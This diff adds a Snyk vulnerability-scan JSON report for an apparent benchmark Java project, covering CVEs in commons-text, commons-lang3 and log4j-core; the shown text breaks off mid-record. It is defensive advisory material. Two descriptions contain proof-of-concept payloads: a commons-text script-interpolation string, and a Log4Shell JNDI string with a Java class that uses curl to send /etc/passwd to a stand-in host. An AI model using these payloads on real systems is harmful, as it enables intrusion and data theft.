@@ -1,0 +1,1334 @@
+{
+  "vulnerabilities": [
+    {
+      "id": "SNYK-JAVA-ORGAPACHECOMMONS-10734078",
+      "title": "Uncontrolled Recursion",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+      "credit": [
+        "Unknown"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[3.0, 3.18.0)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "3.18.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "java",
+      "severity": "high",
+      "cvssScore": 8.8,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.commons:commons-lang3",
+      "references": [
+        {
+          "url": "https://lists.apache.org/thread/bgv0lpswokgol11tloxnjfzdl7yrc1g1",
+          "title": "Apache Pony Mail"
+        },
+        {
+          "url": "https://github.com/apache/commons-lang/commit/b424803abdb2bec818e4fbcb251ce031c22aca53",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "low",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "cvssV3BaseScore": 3.7,
+          "modificationTime": "2025-07-12T06:33:52.830274Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 4.7,
+          "modificationTime": "2025-08-14T11:02:13.905724Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 8.8,
+          "cvssVersion": "4.0",
+          "modificationTime": "2025-07-13T09:08:38.850906Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 8.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-07-13T09:08:38.850906Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "assigner": "Red Hat",
+          "severity": "low",
+          "baseScore": 3.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-07-12T06:33:52.830274Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:H",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 4.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-08-14T11:02:13.905724Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncontrolled Recursion via the `ClassUtils.getClass` function. An attacker can cause the application to terminate unexpectedly by providing excessively long input values.\n## Remediation\nUpgrade `org.apache.commons:commons-lang3` to version 3.18.0 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/bgv0lpswokgol11tloxnjfzdl7yrc1g1)\n- [GitHub Commit](https://github.com/apache/commons-lang/commit/b424803abdb2bec818e4fbcb251ce031c22aca53)\n",
+      "epssDetails": {
+        "percentile": "0.09445",
+        "probability": "0.00033",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2025-48924"
+        ],
+        "CWE": [
+          "CWE-674"
+        ],
+        "GHSA": [
+          "GHSA-j288-q9x7-2f5v"
+        ]
+      },
+      "packageName": "org.apache.commons:commons-lang3",
+      "proprietary": false,
+      "creationTime": "2025-07-13T07:58:53.086065Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2025-07-11T15:31:37Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.commons",
+        "artifactId": "commons-lang3"
+      },
+      "publicationTime": "2025-07-13T09:08:38.832136Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2025-08-14T11:02:13.905724Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.commons:commons-text@1.9",
+        "org.apache.commons:commons-lang3@3.11"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.commons:commons-text@1.14.0",
+        "org.apache.commons:commons-lang3@3.18.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.commons:commons-lang3",
+      "version": "3.11"
+    },
+    {
+      "id": "SNYK-JAVA-ORGAPACHECOMMONS-3043138",
+      "title": "Arbitrary Code Execution",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
+      "credit": [
+        "Alvaro Muñoz"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[1.5,1.10.0)"
+        ]
+      },
+      "exploit": "Functional",
+      "fixedIn": [
+        "1.10.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": "This vulnerability is only applicable when variable string interpolation is being performed on untrusted input to the StringSubstitutor class."
+      },
+      "language": "java",
+      "severity": "high",
+      "cvssScore": 8.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.commons:commons-text",
+      "references": [
+        {
+          "url": "https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om",
+          "title": "Apache Lists"
+        },
+        {
+          "url": "https://github.com/apache/commons-text/commit/b9b40b903e2d1f9935039803c9852439576780ea",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/apache/commons-text/pull/341",
+          "title": "GitHub PR"
+        },
+        {
+          "url": "https://github.com/apache/commons-text/releases/tag/rel%2Fcommons-text-1.10.0",
+          "title": "GitHub Release"
+        },
+        {
+          "url": "https://snyk.io/blog/reviewing-cve-2022-42889-in-apache-commons-text/",
+          "title": "Snyk Blog"
+        },
+        {
+          "url": "https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/cves/2022/CVE-2022-42889.yaml",
+          "title": "Nuclei Templates"
+        },
+        {
+          "url": "https://www.exploit-db.com/exploits/52261",
+          "title": "Exploit DB"
+        },
+        {
+          "url": "https://github.com/karthikuj/cve-2022-42889-text4shell-docker",
+          "title": "PoC in GitHub"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2024-03-11T09:51:58.269814Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2024-03-11T09:53:47.098282Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 8.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-06-10T15:25:03.486980Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "NVD",
+          "severity": "critical",
+          "baseScore": 9.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:51:58.269814Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "critical",
+          "baseScore": 9.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:47.098282Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution via the `StringSubstitutor` interpolator object. Exploiting this vulnerability is possible when untrusted data flows into the `StringSubstitutor.replace()` or `StringSubstitutor.replaceIn()` methods. \r\n\r\nDue to the nature of these methods as ones that process application data and not user input, a remote attacker would need prior access to a system in the affected environment positioned to supply such data.\r\n\r\n**Notes**\r\n\r\nThe Nashorn scripting engine that can be used to exploit this vulnerability was available by default in JDKs up to 14.0.2. As of JDK 15, this vulnerability can only be exploited if another scripting engine has been added, such as JEXL.\r\n\r\nVulnerable lookups:\r\n\r\n1) `script` - executes expressions using the JVM script execution engine (javax.script)\r\n\r\n2) `dns` - resolves dns records\r\n\r\n3) `url` - loads values from urls, including from remote servers\r\n\r\n## PoC\r\n\r\n```java\r\nfinal StringSubstitutor interpolator = StringSubstitutor.createInterpolator();\r\nString out = interpolator.replace(\"${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}\");\r\nSystem.out.println(out);\r\n```\n## Remediation\nUpgrade `org.apache.commons:commons-text` to version 1.10.0 or higher.\n## References\n- [Apache Lists](https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om)\n- [GitHub Commit](https://github.com/apache/commons-text/commit/b9b40b903e2d1f9935039803c9852439576780ea)\n- [GitHub PR](https://github.com/apache/commons-text/pull/341)\n- [GitHub Release](https://github.com/apache/commons-text/releases/tag/rel%2Fcommons-text-1.10.0)\n- [Snyk Blog](https://snyk.io/blog/reviewing-cve-2022-42889-in-apache-commons-text/)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/cves/2022/CVE-2022-42889.yaml)\n- [Exploit DB](https://www.exploit-db.com/exploits/52261)\n- [PoC in GitHub](https://github.com/karthikuj/cve-2022-42889-text4shell-docker)\n",
+      "epssDetails": {
+        "percentile": "0.99926",
+        "probability": "0.94251",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2022-42889"
+        ],
+        "CWE": [
+          "CWE-94"
+        ]
+      },
+      "packageName": "org.apache.commons:commons-text",
+      "proprietary": false,
+      "creationTime": "2022-10-13T14:44:26.521875Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2022-10-13T14:22:37Z",
+      "exploitDetails": {
+        "sources": [
+          "ExploitDB",
+          "Nuclei Templates",
+          "PoC in GitHub",
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Functional",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.commons",
+        "artifactId": "commons-text"
+      },
+      "publicationTime": "2022-10-13T15:14:29Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-04-06T05:07:15.718619Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.commons:commons-text@1.9"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.commons:commons-text@1.10.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.commons:commons-text",
+      "version": "1.9"
+    },
+    {
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-14532782",
+      "title": "Improper Validation of Certificate with Host Mismatch",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+      "credit": [
+        "Samuli Leinonen"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.25.3)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "2.25.3"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "java",
+      "severity": "medium",
+      "cvssScore": 6.3,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "references": [
+        {
+          "url": "https://logging.apache.org/security.html%23CVE-2025-68161",
+          "title": "Apache Advisory"
+        },
+        {
+          "url": "https://logging.apache.org/log4j/2.x/manual/appenders/network.html%23SslConfiguration-attr-verifyHostName",
+          "title": "Apache Documentation"
+        },
+        {
+          "url": "https://logging.apache.org/log4j/2.x/manual/systemproperties.html%23log4j2.sslVerifyHostName",
+          "title": "Apache Documentation"
+        },
+        {
+          "url": "https://lists.apache.org/thread/xr33kyxq3sl67lwb61ggvm1fzc8k7dvx",
+          "title": "Apache Thread"
+        },
+        {
+          "url": "https://github.com/apache/logging-log4j2/commit/3b93748497e1adbbd027fda8a5e7268ec5d0d578",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/apache/logging-log4j2/pull/4002",
+          "title": "GitHub PR"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+          "cvssV3BaseScore": 4.8,
+          "modificationTime": "2026-01-13T01:13:55.808335Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvssV3BaseScore": 5.9,
+          "modificationTime": "2026-01-13T13:31:37.447463Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+          "cvssV3BaseScore": 5.4,
+          "modificationTime": "2026-01-24T11:43:26.404517Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:L/SA:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.3,
+          "cvssVersion": "4.0",
+          "modificationTime": "2025-12-19T08:13:26.209519Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2025-12-19T08:13:26.209519Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+          "assigner": "NVD",
+          "severity": "medium",
+          "baseScore": 4.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-01-13T01:13:55.808335Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-01-13T13:31:37.447463Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 5.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-01-24T11:43:26.404517Z"
+        }
+      ],
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Improper Validation of Certificate with Host Mismatch due to the lack of TLS hostname verification in the `SocketAppender` component. An attacker can intercept or redirect log traffic by performing a man-in-the-middle attack if they are able to intercept or redirect network traffic between the client and the log receiver and can present a server certificate issued by a certification authority trusted by the configured trust store or the default Java trust store.\n\n## Workaround\n\nThis vulnerability can be mitigated by configuring the `SocketAppender` to use a private or restricted trust root to limit the set of trusted certificates.\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.25.3 or higher.\n## References\n- [Apache Advisory](https://logging.apache.org/security.html#CVE-2025-68161)\n- [Apache Documentation](https://logging.apache.org/log4j/2.x/manual/appenders/network.html#SslConfiguration-attr-verifyHostName)\n- [Apache Documentation](https://logging.apache.org/log4j/2.x/manual/systemproperties.html#log4j2.sslVerifyHostName)\n- [Apache Thread](https://lists.apache.org/thread/xr33kyxq3sl67lwb61ggvm1fzc8k7dvx)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/3b93748497e1adbbd027fda8a5e7268ec5d0d578)\n- [GitHub PR](https://github.com/apache/logging-log4j2/pull/4002)\n",
+      "epssDetails": {
+        "percentile": "0.09795",
+        "probability": "0.00034",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2025-68161"
+        ],
+        "CWE": [
+          "CWE-297"
+        ]
+      },
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "proprietary": false,
+      "creationTime": "2025-12-19T08:13:25.867207Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2025-12-18T21:45:07.806000Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.logging.log4j",
+        "artifactId": "log4j-core"
+      },
+      "publicationTime": "2025-12-19T08:13:26.143187Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-01-24T11:43:26.404517Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.25.3"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720",
+      "title": "Remote Code Execution (RCE)",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+      "credit": [
+        "Chen Zhaojun of Alibaba Cloud Security Team"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta9,2.3.1)",
+          "[2.4,2.12.2)",
+          "[2.13.0,2.15.0)"
+        ]
+      },
+      "exploit": "High",
+      "fixedIn": [
+        "2.3.1",
+        "2.12.2",
+        "2.15.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "java",
+      "severity": "critical",
+      "cvssScore": 10,
+      "functions": [
+        {
+          "version": [
+            "[2.0-beta9,2.3.1)",
+            "[2.4,2.12.2)",
+            "[2.13.0,2.15.0)"
+          ],
+          "functionId": {
+            "filePath": "org/apache/logging/log4j/core/lookup/JndiLookup.java",
+            "className": "JndiLookup",
+            "functionName": "lookup"
+          }
+        }
+      ],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "references": [
+        {
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3198",
+          "title": "Apache Jira Issues"
+        },
+        {
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3201",
+          "title": "Apache Jira Issues"
+        },
+        {
+          "url": "https://logging.apache.org/log4j/2.x/security.html",
+          "title": "Apache Security Advisory"
+        },
+        {
+          "url": "https://github.com/apache/logging-log4j2/pull/608",
+          "title": "GitHub PR"
+        },
+        {
+          "url": "https://github.com/Kirill89/log4shell-vulnerable-server",
+          "title": "PoC"
+        },
+        {
+          "url": "https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/",
+          "title": "Snyk Blog and Vulnerability Breakdown"
+        },
+        {
+          "url": "https://www.exploit-db.com/exploits/51183",
+          "title": "Exploit DB"
+        },
+        {
+          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+          "title": "CISA - Known Exploited Vulnerabilities"
+        },
+        {
+          "url": "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-44228.yaml",
+          "title": "Nuclei Templates"
+        },
+        {
+          "url": "https://github.com/xsultan/log4jshield",
+          "title": "PoC in GitHub"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+          "cvssV3BaseScore": 10,
+          "modificationTime": "2024-03-11T09:48:46.605332Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2024-03-11T09:53:58.520882Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+          "assigner": "Snyk",
+          "severity": "critical",
+          "baseScore": 10,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-06T14:09:43.264835Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+          "assigner": "NVD",
+          "severity": "critical",
+          "baseScore": 10,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:48:46.605332Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "critical",
+          "baseScore": 9.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2024-03-11T09:53:58.520882Z"
+        }
+      ],
+      "description": "## Overview\n\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE).\nApache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.\r\n\r\nFrom log4j 2.15.0, JNDI LDAP endpoints are restricted to localhost by default.\r\n\r\n\r\n## PoC\r\nWhen an application uses log4j to log user input, an attacker can exploit this vulnerability, by supplying a malicious string that the application logs - for example,  `${jndi:ldap://someurl/Evil}`. This causes the application to execute a malicious class supplied by an attacker’s LDAP server (`someurl/Evil` in this example).\r\n\r\nFor example, the vulnerability can be used to inject this malicious class into an application:\r\n```java\r\npublic class Evil implements ObjectFactory  {\r\n   @Override\r\n   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {\r\n       Runtime.getRuntime().exec(\"curl -F 'file=@/etc/passw‍đ' https://someurl/upload\");\r\n       return  null;\r\n   }\r\n}\r\n```\r\nThis causes the application to disclose the `etc/passwd` file on the system, and send it to a remote attacker.\r\n\r\n## Further Remediation Options\r\nIf upgrading the version is not possible, we strongly recommend to mitigate the vulnerability using one of these methods:\r\n\r\n* Remove `JndiLookup.class` from the class path (i.e: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. While not pertinent to log4shell, consider also removing `JndiManager`, `JMSAppender` and `SMTPAppender` if you are not using them, as there are unconfirmed reports they could be leveraged in similar attacks in the future.\r\n* Partial mitigation: disable lookups via system properties or environmental variables. If you use log4j >=2.10.0, you can set the system property `LOG4J_FORMAT_MSG_NO_LOOKUPS` or the environmental variable `Dlog4j2.formatMsgNoLookups` to `true`. (RCE is possible in some non-default Pattern Layout configurations that use a Context Lookup or a Thread Context Map pattern.)\r\n\r\n<br>Upgrading your JDK versions is not enough to mitigate this vulnerability in all circumstances, as it was proven that setting the `com.sun.jndi.ldap.object.trustURLCodebase` property to `false` is not enough.\r\n<br>For more remediation advice, please visit the [Log4j Remediation Cheat Sheet](https://snyk.io/blog/log4shell-remediation-cheat-sheet/) post.\r\n\r\n\r\n**Note**: `org.apache.logging.log4j:log4j-api` was originally deemed vulnerable, but Apache maintainers have since [clarified](https://issues.apache.org/jira/browse/LOG4J2-3201) that this only affects `org.apache.logging.log4j:log4j-core`.\n\n## Remediation\n\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.15.0 or higher.\n\n\nUse [this guide](https://snyk.io/blog/find-fix-log4shell-quickly-snyk/) to scan your projects for the Log4Shell vulnerability.\n\n## References\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3198)\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3201)\n\n- [Apache Security Advisory](https://logging.apache.org/log4j/2.x/security.html)\n\n- [GitHub PR](https://github.com/apache/logging-log4j2/pull/608)\n\n- [PoC](https://github.com/Kirill89/log4shell-vulnerable-server)\n\n- [Snyk Blog and Vulnerability Breakdown](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/51183)\n\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-44228.yaml)\n\n- [PoC in GitHub](https://github.com/xsultan/log4jshield)\n",
+      "epssDetails": {
+        "percentile": "0.99960",
+        "probability": "0.94358",
+        "modelVersion": "v2025.03.14"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-44228"
+        ],
+        "CWE": [
+          "CWE-94"
+        ],
+        "GHSA": [
+          "GHSA-jfh8-c2jp-5v3q"
+        ]
+      },
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "proprietary": false,
+      "creationTime": "2021-12-10T10:08:46.155884Z",
+      "functions_new": [
+        {
+          "version": [
+            "[2.0-beta9,2.3.1)",
+            "[2.4,2.12.2)",
+            "[2.13.0,2.15.0)"
+          ],
+          "functionId": {
+            "className": "org.apache.logging.log4j.core.lookup.JndiLookup",
+            "functionName": "lookup"
+          }
+        }
+      ],
+      "alternativeIds": [],
+      "disclosureTime": "2021-12-10T10:02:55Z",
+      "exploitDetails": {
+        "sources": [
+          "CISA",
+          "ExploitDB",
+          "Nuclei Templates",
+          "PoC in GitHub",
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "High",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Attacked",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "maven",
+      "mavenModuleName": {
+        "groupId": "org.apache.logging.log4j",
+        "artifactId": "log4j-core"
+      },
+      "publicationTime": "2021-12-10T10:10:01Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-03-26T05:05:08.087205Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "critical",
+      "from": [
+        "com.benchmark:vuln-directa-n1@1.0.0",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.15.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2320014",
+      "title": "Remote Code Execution (RCE)",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C",
+      "credit": [
+        "Unknown"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta9,2.3.1)",
+          "[2.4,2.12.2)",
+          "[2.13.0,2.16.0)"
+        ]
+      },
+      "exploit": "High",
+      "fixedIn": [
+        "2.3.1",
+        "2.12.2",
+        "2.16.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "java",
+      "severity": "critical",
+      "cvssScore": 9,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "references": [
+        {
+          "url": "https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f",
+          "title": "Apache Pony Mail"
+        },
+        {
+          "url": "https://logging.apache.org/log4j/2.x/security.html",
+          "title": "Apache Security Page"
+        },
+        {
+          "url": "https://twitter.com/marcioalm/status/1471740771581652995",
+          "title": "Twitter Post"
+        },
+        {
+          "url": "https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/cves/2021/CVE-2021-45046.yaml",
+          "title": "Nuclei Templates"
+        },
+        {
+          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+          "title": "CISA - Known Exploited Vulnerabilities"
+        },
+        {
+          "url": "https://github.com/mergebase/log4j-samples",
+          "title": "PoC in GitHub"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
